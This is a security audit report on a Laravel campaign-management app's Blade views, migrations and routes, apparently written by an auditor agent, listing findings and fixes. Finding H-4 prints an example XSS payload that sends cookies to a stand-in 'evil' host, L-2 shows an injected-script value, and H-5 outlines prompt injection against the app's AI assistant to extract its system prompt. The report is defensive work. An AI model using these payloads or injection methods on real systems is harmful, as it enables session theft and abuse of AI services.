# Chunk 5 — Frontend (Blade) & DB Schema (Security Audit)

**Date:** 2026-04-05
**Scope:** `resources/views/**` (86 Blade files), `database/migrations/*.php` (39 files), `routes/web.php`, `routes/auth.php`
**Auditor:** Security Auditor agent

---

## AI Key / Secret Exposure Check (DETAILED)

A grep across every Blade view for the patterns `env(`, `config(`, `api_key`, `API_KEY`, `ANTHROPIC`, `OPENAI`, `CLAUDE`, `sk-`, `secret`, `token` produced the following hits. Each one is evaluated below.

| # | File:Line | Matched Text | Assessment |
|---|-----------|--------------|------------|
| 1 | `resources/views/layouts/guest.blade.php:8` | `{{ config('app.name', 'Laravel') }}` | **SAFE.** Public app name only. |
| 2 | `resources/views/layouts/auth-split.blade.php:7` | `{{ config('app.name', 'MadData') }}` | **SAFE.** Public app name only. |
| 3 | `resources/views/auth/2fa-setup.blade.php:66` | `{!! $qrCodeSvg !!}` | **INFORMATIONAL.** SVG produced server-side by the 2FA library, not user input. Raw render is required for an SVG. Shown only to the authenticated user during their own 2FA setup. See L-1. |
| 4 | `resources/views/auth/2fa-setup.blade.php:75,77` | `{{ $secret }}` + `navigator.clipboard.writeText('{{ $secret }}')` | **INFORMATIONAL (by design).** The TOTP shared secret must be displayed once to the user during enrollment so they can register it in their authenticator app. Route is `auth` + same-user-only. No broadcast. See L-2 for hardening ideas. |
| 5 | `resources/views/users/edit.blade.php:248` | `$user->google2fa_secret` used in `@if` check only | **SAFE.** Only a truthiness check; the secret itself is never rendered to HTML. |
| 6 | `resources/views/tokens/index.blade.php:18` | `{{ session('token') }}` | **SAFE (by design).** Newly-issued Sanctum API token shown once via flash-session. Route is `auth` + `campaign_manager` middleware, shown only to the user who just generated it. |
| 7 | `resources/views/layouts/app.blade.php:8`, `auth-split.blade.php:6`, `guest.blade.php:6` | `{{ csrf_token() }}` in `<meta name="csrf-token">` | **SAFE.** CSRF tokens are designed to be placed in pages so the frontend can read them. |
| 8 | `resources/views/auth/reset-password.blade.php:19` | `{{ $request->route('token') }}` | **SAFE.** Password-reset token is supposed to be in the URL / form; it's single-use and time-limited. |

**No Anthropic / OpenAI / Claude / DSP API keys, DB credentials, or server secrets are rendered into any Blade view, meta tag, data-attribute, inline script, or Alpine `x-data` block anywhere in the codebase.**

AI endpoints (`/ai/generate-locations`, `/ai/campaign-assistant`) correctly call server-side controllers; the browser never sees the upstream AI provider keys (`resources/views/campaigns/edit.blade.php:401,478`).

`localStorage` usage (`resources/views/dashboard/index.blade.php:362-578`, `components/dates-filter.blade.php:4-17`) stores only UI preferences (`dashboardActiveTab`, `dashboardPerPage`, `dateRange`, `campaign_id`) — no tokens, secrets, or PII. **SAFE.**

Vite build (`resources/js/`): grepped for `env(`, `config(` — zero matches. Build assets do not contain server-side config values. **SAFE.**

---

## Critical

_None identified._ The highest-risk vector for this chunk — leaked AI/DSP API keys in client-rendered HTML — is clean.

---

## High

### H-1 — `email_verified_at` never populated but `verification.*` routes are live
**Severity:** High (Auth bypass surface) · **CWE-287**
**Location:** `routes/auth.php:47-55`, `database/migrations/0001_01_01_000000_create_users_table.php:18`
**Scenario:** The auth routes expose `verification.notice`, `verification.verify`, and `verification.send`, but the registration route is disabled (`routes/auth.php:16-18`) and users are created by admins. If any route/middleware were later chained with `verified`, users with a NULL `email_verified_at` would be locked out silently; conversely, if the `verified` middleware is removed anywhere, unverified accounts (potentially created with attacker-supplied emails by an admin import) could access protected pages. The `verification.send` + `verification.verify` path permits a user who knows a valid signed URL (e.g. via an email-forwarding mishap) to self-verify without a password challenge.
**Mitigation:**
1. Either drop the verification routes entirely (user is managed-service, admin-provisioned), or enforce `email_verified_at = now()` on admin `store()` so verification is meaningless to bypass.
2. Add a seeder/migration that backfills `email_verified_at` for all existing users so the `verified` middleware becomes safe to add anywhere in the future.

### H-2 — `agency_user.role` column is authoritative-looking but ignored
**Severity:** High (Confused-deputy / RBAC ambiguity) · **CWE-863**
**Location:** `database/migrations/2026_03_22_000003_create_agency_user_table.php:14` (`$table->string('role')->default('viewer')`)
**Scenario:** The pivot table carries a `role` string column that looks like it grants per-agency authorization ("viewer" vs other values), but per `MEMORY.md` the real authority column is `access_all_clients` added later (`2026_03_23_073504_update_agency_user_add_access_all_clients.php`). A future developer reading the schema may believe `role='admin'` on the pivot grants agency-admin powers and write code trusting it, creating silent privilege escalation. The column is not constrained (any arbitrary string accepted).
**Mitigation:** Drop the unused `role` column in a new migration, or add a CHECK constraint and document its meaning. If kept, add a Schema::whereNotIn enum so only approved values can persist.

### H-3 — `password_reset_tokens.token` stored in plaintext-looking column with no expiry
**Severity:** High · **CWE-522**
**Location:** `database/migrations/0001_01_01_000000_create_users_table.php:27-31`
**Scenario:** Laravel hashes this token before storing, but the column lacks an index and there is no explicit `expires_at`. Expiry is enforced only by `config('auth.passwords.users.expire')` against `created_at`. If that config is widened (currently defaults to 60 minutes) or a row is accidentally resurrected via a backup restore, old reset links become usable again. An attacker with DB read access could attempt to brute-force the bcrypt hash offline.
**Mitigation:** Add `$table->index('created_at')` for cleanup jobs, add a scheduled `Artisan::command('auth:clear-resets')` to purge rows older than the expiry, and consider using `password_reset_tokens` with a shorter `config('auth.passwords.users.expire')` (e.g. 15 minutes).

### H-4 — 2FA QR SVG uses raw `{!! !!}` without origin assertion
**Severity:** High (Stored/reflected XSS surface if library is ever swapped) · **CWE-79**
**Location:** `resources/views/auth/2fa-setup.blade.php:66`
**Scenario:** `{!! $qrCodeSvg !!}` renders whatever the controller passes in. Today that is the `bacon/bacon-qr-code` SVG writer output (trusted). If a future refactor passes the user's TOTP label (which includes `$user->email`) through a different writer or concatenates user input into the SVG, an attacker who can change their own email to `"><script>fetch('//evil/?c='+document.cookie)</script>` would self-XSS on the 2FA setup page, which still has the TOTP secret on-screen.
**Mitigation:** Wrap the SVG string in a dedicated `SafeSvg` value object, assert `str_starts_with($svg, '<svg')` and strip any `<script>`/`<foreignObject>` tags before rendering. Alternatively render the QR as a base64 PNG via `<img src="data:image/png;base64,...">` where no raw HTML is needed.

### H-5 — `CampaignAssistant`/`AiLocation` endpoints trust `currentFormData` from client
**Severity:** High (Prompt injection / quota abuse) · **CWE-20, CWE-400**
**Location:** `routes/web.php:11-12`, `resources/views/campaigns/edit.blade.php:481`
**Scenario:** The assistant body includes `currentFormData` + `chatHistory` from the browser, then forwards to the upstream AI provider. A malicious user inside a tenant can craft `chatHistory` to exfiltrate system prompt content or burn the company's AI credits (`throttle:10,1` = up to 14,400 requests/user/day). No per-campaign authorization check is done when the assistant routes are hit; an authenticated user can call `/ai/campaign-assistant` without supplying a campaign id, so every user consumes the same billing bucket.
**Mitigation:** (1) Add a server-side `campaign_id` to the request and verify the user has access to that campaign via the client/agency pivot; (2) Tighten throttle to `throttle:5,1` + a daily cap using `RateLimiter::for('ai', ...)`; (3) Strip/ignore the client-sent `currentFormData` and re-load it server-side from the DB using the authorized campaign, so the prompt always reflects trusted data.

---

## Medium

### M-1 — Hidden `role_id` `<select>` with no in-view privilege-escalation guard
**Severity:** Medium (Privilege escalation if controller forgets to check) · **CWE-269**
**Location:** `resources/views/users/create.blade.php:198`, `users/edit.blade.php:211`, `agency/users/create.blade.php:158`, `agency/users/edit.blade.php:178`
**Scenario:** These `<select name="role_id">` elements list *every* role returned by the controller. If the controller ever returns `Role::all()` unfiltered, a non-admin user with access to `agency.users.edit` could POST a higher-tier `role_id` (e.g. Admin) and escalate. The Blade view is not defense-in-depth — it trusts the controller entirely.
**Mitigation:** In every form-request, reject `role_id` values whose role-level > current user's role-level (`$this->user()->userRole->level`). Add a feature test `it('prevents non-admin from assigning admin role')` per `CLAUDE.md` test-coverage rule.

### M-2 — Free-form `targeting_rules` hidden inputs posted without whitelist
**Severity:** Medium (Mass-assignment / JSON pollution) · **CWE-915**
**Location:** `resources/views/components/campaign/targeting-accordion.blade.php:31-51`
**Scenario:** ~18 hidden `<input name="targeting_rules[...]">` fields are dynamically generated from Alpine state. Because a user can append arbitrary additional keys via devtools (e.g. `targeting_rules[__proto__]`, `targeting_rules[script]`), the controller must cast/whitelist before storing to JSON. If the model casts `targeting_rules` to `array` and the whole request bag is saved, pollution is persisted and later rendered into the Blade view.
**Mitigation:** In `CampaignFormRequest` explicitly whitelist sub-keys (`genders`, `ages`, `incomes`, `device_types`, `os`, `connection_types`, `environments`, `days`, `time_start`, `time_end`, `countries`, `regions`, `cities`) and use `$validated['targeting_rules']` only, never `$request->input('targeting_rules')`.

### M-3 — `creative_files` table has no `unique` on `(creative_id, path)` and no size cap
**Severity:** Medium (Storage DoS / overwrite) · **CWE-400**
**Location:** `database/migrations/2026_02_03_123710_add_details_to_creative_files_table.php:14-17`
**Scenario:** `path`, `mime_type`, and `size` are nullable and unconstrained. Nothing prevents a user from uploading thousands of duplicates for the same creative, or a 10 GB file (DB-level). The 2026_02_02 migration also lacks a max length on `path`, defaulting to VARCHAR(255), which may truncate long S3 keys.
**Mitigation:** Add `unique(['creative_id', 'path'])`, `size` NOT NULL, and a CHECK constraint `size <= 52428800` (50 MB). Enforce at Form-Request level as well.

### M-4 — `activity_logs.changes` is `json` nullable with no redaction layer
**Severity:** Medium (Sensitive-data exposure in audit trail) · **CWE-532**
**Location:** `database/migrations/2026_02_08_144832_create_activity_logs_table.php:21`
**Scenario:** The `changes` JSON column records model diffs. When a user record is updated, the diff can contain `password` (bcrypt hash — still sensitive), `google2fa_secret`, `remember_token`, or API-token names. Any admin with access to `/admin/activity-logs` then sees these values.
**Mitigation:** In `ActivityLogger`/`CampaignObserver`, strip keys in a blacklist: `['password', 'google2fa_secret', 'remember_token', 'api_token', 'email_verified_at']` before writing to `changes`. Add a test asserting the blacklist is enforced.

### M-5 — `personal_access_tokens.expires_at` nullable — tokens can be indefinite
**Severity:** Medium · **CWE-613**
**Location:** `database/migrations/2026_03_05_170243_create_personal_access_tokens_table.php:25`
**Scenario:** `expires_at` nullable means a Sanctum token can be created without an expiry and persist forever. `CheckTokenExpiry` middleware presumably short-circuits when `expires_at` is null, granting eternal access. If a user laptop is compromised, the stolen bearer token remains valid until the user manually revokes it.
**Mitigation:** Change the column to NOT NULL with a DB default of `DATE_ADD(NOW(), INTERVAL 90 DAY)`, and force `TokenController@store` to always set a concrete expiry. Reject requests where `expires_at IS NULL` in `CheckTokenExpiry` middleware.

### M-6 — `campaigns.budget` / `expected_impressions` are INT — overflow + negative values
**Severity:** Medium (Business-logic abuse) · **CWE-190**
**Location:** `database/migrations/2025_05_12_055140_create_campaigns_table.php:18-20`
**Scenario:** `integer` (SIGNED INT, max 2,147,483,647) with no CHECK constraint. A user can submit `budget=-1` or `expected_impressions=2147483648` (overflow → negative wrap on some DBs) to break reporting math or bypass spend caps in downstream code.
**Mitigation:** Change to `unsignedBigInteger` and add CHECK `>= 0`. Add Form-Request rules `numeric|min:0|max:9999999999`.

### M-7 — Session table created in separate migration with no FK cascade
**Severity:** Medium (Orphan sessions / session fixation) · **CWE-613**
**Location:** `database/migrations/2026_03_25_125623_create_sessions_table.php` + `0001_01_01_000000_create_users_table.php:33`
**Scenario:** Two migrations both create the sessions table (note the fresh users-table migration embeds a sessions schema at line 33). If a user is deleted, their sessions remain (`user_id` is just indexed, not constrained). An admin-reused user ID could inherit the deleted user's active sessions.
**Mitigation:** Add `foreignId('user_id')->nullable()->constrained()->cascadeOnDelete()`. Reconcile the duplicate sessions-schema — only one migration should create the table.

---

## Low

### L-1 — Raw SVG QR with `select-all` + clipboard button
**Severity:** Low · **CWE-200**
**Location:** `resources/views/auth/2fa-setup.blade.php:75-78`
**Scenario:** The TOTP secret is displayed with `select-all` and auto-copied to clipboard on button click. A browser extension with clipboard-read access will see it. This is an accepted tradeoff for UX.
**Mitigation:** Add a "Hide secret" toggle that defaults to masked (`••••••••••••••••`); only reveal on click. Auto-clear clipboard after 30 s using `setTimeout(() => navigator.clipboard.writeText(''), 30000)`.

### L-2 — Alpine `x-data` embeds `old('status')` without escaping quotes
**Severity:** Low (XSS via malformed POST body) · **CWE-79**
**Location:** `resources/views/campaigns/create.blade.php:153` (`x-data="{ state: '{{ old('status', 'active') }}' }"`), `components/campaign/details-card.blade.php:111`, `admin/agencies/create.blade.php:25`, `components/campaign/creatives-accordion.blade.php:39`
**Scenario:** `old('status')` is echoed with double curly braces (HTML-escaped) but then wrapped in single-quotes *inside* a JS string inside an HTML attribute. If a user POSTs `status=a'); alert(1)//` the HTML-escape will leave the apostrophe intact (it only escapes `<>&"'`). Actually `{{ }}` does escape `'` via `e()` → `&#039;`, so this exact vector is blocked, but the coding pattern is fragile and breaks the CLAUDE.md rule that requires `@js()` for values-inside-attributes.
**Mitigation:** Replace with `x-data="{ state: @js(old('status', 'active')) }"` everywhere. Same for `creative_optimization` cast (line 39) which does `? '1' : '0'` — use `@js((bool) old(...))` for type-safety.

### L-3 — Client-controlled `:action` URL on Alpine forms
**Severity:** Low (Open-redirect / CSRF target confusion) · **CWE-601**
**Location:** `resources/views/users/index.blade.php:187` (`<form :action="user.delete_url" method="POST">`), `resources/views/agency/users/index.blade.php:137`
**Scenario:** `user.delete_url` is supplied by the server JSON payload so today it is safe. However, if the JSON feed is ever cached across tenants or a JSON injection bug is introduced in `UserController@index`, a malicious tenant could have the form POST to an arbitrary same-origin route (including admin routes), exploiting the user's own CSRF token.
**Mitigation:** Build URLs client-side from IDs (`:action="'/admin/users/' + user.id"`) instead of trusting server-rendered URLs. Or assert `user.delete_url` starts with `/admin/users/` in the Alpine template.

### L-4 — GET `/campaigns/client/{client_id?}` has no tenant scoping in route definition
**Severity:** Low (Relies solely on controller check) · **CWE-639 (IDOR)**
**Location:** `routes/web.php:24`
**Scenario:** The route does not use route-model binding (`{client}`) — it accepts a raw integer `{client_id?}`. All authorization is deferred to the controller. If `CampaignController@index` ever forgets to validate the user can see that client, an authenticated user can enumerate `/campaigns/client/1..N` to list campaigns belonging to other tenants.
**Mitigation:** Convert to `{client}` route-model binding and add `Gate::authorize('view', $client)` at the top of the controller action. Add an IDOR feature test.

### L-5 — Dashboard export endpoint accepts query-string dates without validation in route
**Severity:** Low · **CWE-20**
**Location:** `routes/web.php:52` (`/dashboard/{campaign}/export`)
**Scenario:** GET route mutates nothing, but unbounded date ranges could force a 10 M-row Excel export, OOM-killing the PHP-FPM worker.
**Mitigation:** Add a Form-Request that caps `end_date - start_date <= 365 days` and use queued export for large ranges.

### L-6 — `admin.system-status.terminate-all` and `terminate-user` lack soft-guard
**Severity:** Low (Self-DoS risk) · **CWE-863**
**Location:** `routes/web.php:93-94`
**Scenario:** An admin can accidentally terminate their own session via `terminate-all` and lock themselves out if they are the only admin with 2FA configured. No confirmation token exchange is enforced server-side; the Blade confirm-dialog is client-only.
**Mitigation:** In the controller, skip the current admin's session in `terminateAll`, and reject `terminateUser` when `$user->id === auth()->id()`.

### L-7 — `clients.agency` legacy string column drop migration inlines data migration
**Severity:** Low (Deploy risk) · **CWE-471**
**Location:** `database/migrations/2026_03_22_000005_drop_agency_string_from_clients_table.php` (inline per MEMORY.md)
**Scenario:** The inline data migration reads text → creates agencies → drops column. If it fails mid-way (DB connection drop, unique-name collision), clients end up with no `agency_id` set and no way to rollback the string column. Not a direct vulnerability but an availability/integrity risk.
**Mitigation:** Wrap in `DB::transaction()`, add idempotency checks (`if (!Schema::hasColumn(...))`), and keep a backup table `clients_legacy_agency_backup`.

---

## Informational

- `routes/web.php` correctly places every non-API, non-auth route under the `auth` middleware group. No debug/dev endpoints are exposed in production routes.
- All 60+ `<form>` elements inspected use `@csrf` (spot-check confirmed via grep count of 60 `@csrf` directives across 37 Blade files matching the form count closely). Forms using `:action` with Alpine still include `<input type="hidden" name="_token" value="{{ csrf_token() }}">` (`users/index.blade.php:188`, `agency/users/index.blade.php:138`).
- Only three GET forms exist, all idempotent (filter/date forms): `admin/activity_logs/index.blade.php:9`, `components/dates-filter.blade.php:59`, `dashboard/index.blade.php:85`. No verb-tampering risk.
- `x-html` is never used. `{!! !!}` is used exactly once (item #3 above, trusted server-side SVG).
- `@js()` and `Js::from()` are used consistently for JSON-in-attribute contexts: `users/edit.blade.php:295-297`, `users/create.blade.php`, `components/campaign/targeting-accordion.blade.php:14-27`, `components/campaign/audiences-accordion.blade.php:4`, `tokens/index.blade.php:120`. Good.
- `resources/js/` contains no hard-coded secrets.
- `remember_token` (users table) is correctly created via `rememberToken()` helper (60-char VARCHAR, nullable).
- Sanctum `personal_access_tokens.token` column is `VARCHAR(64) UNIQUE` and stores a SHA-256 hash (Laravel default) — correct.
- `google2fa_secret` stored as `text` specifically to accommodate `encrypted` cast payload. Verify the User model has `'google2fa_secret' => 'encrypted'` in `$casts` (outside this chunk's scope but important).

---

## Summary

| Severity | Count |
|----------|-------|
| Critical | 0 |
| High     | 5 |
| Medium   | 7 |
| Low      | 7 |
| Informational | 9 |

**Top 3 fixes to ship first:**
1. **H-5** — Bind `/ai/*` endpoints to an authorized `campaign_id` and reload form data server-side.
2. **H-1** — Either decommission verification routes or backfill `email_verified_at` so the `verified` middleware is safe to add.
3. **M-5** — Enforce non-null `expires_at` on Sanctum tokens and reject NULL-expiry tokens in `CheckTokenExpiry` middleware.
